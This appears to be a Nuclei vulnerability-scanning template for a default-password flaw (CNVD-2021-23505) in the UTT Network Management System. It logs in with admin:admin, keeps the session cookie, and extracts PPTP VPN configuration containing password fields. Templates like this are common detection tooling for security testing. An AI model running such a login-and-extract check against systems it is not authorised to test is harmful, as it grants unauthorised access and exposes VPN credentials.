id: utt-network-management-system-default-password

info:
  name: UTT Network Management System Default Password
  author: ProjectDiscoveryAI
  severity: high
  description: |
    UTT Net Management System has a default password. Attackers can log in through admin:admin, check the system status, configure the Net Management System, and configure VPN.
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-23505
  tags: defaultaccount
  classification:
    cve-id:
      - CNVD-2021-23505

variables:
  username: "admin"
  password: "admin"

flow: |
  http(1) && http(2)

http:
  - id: login-check
    method: POST
    path:
      - "{{BaseURL}}/action/login"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "username={{username}}&password={{password}}"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Set-Cookie"

    extractors:
      - type: regex
        name: session_cookie
        part: header
        regex:
          - "Set-Cookie: ([^;]+)"
        internal: true

  - id: vpn-config-check
    method: GET
    path:
      - "{{BaseURL}}/common.asp?optType=PPTPSERVER"
    headers:
      Cookie: "{{session_cookie}}"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "var srv_outboundss = new Array();"
      - type: regex
        part: body
        regex:
          - "passwds"

    extractors:
      - type: regex
        name: pptp_details
        part: body
        regex:
          - "var srv_outboundss = new Array\\(\\)(.*?);bindIps"
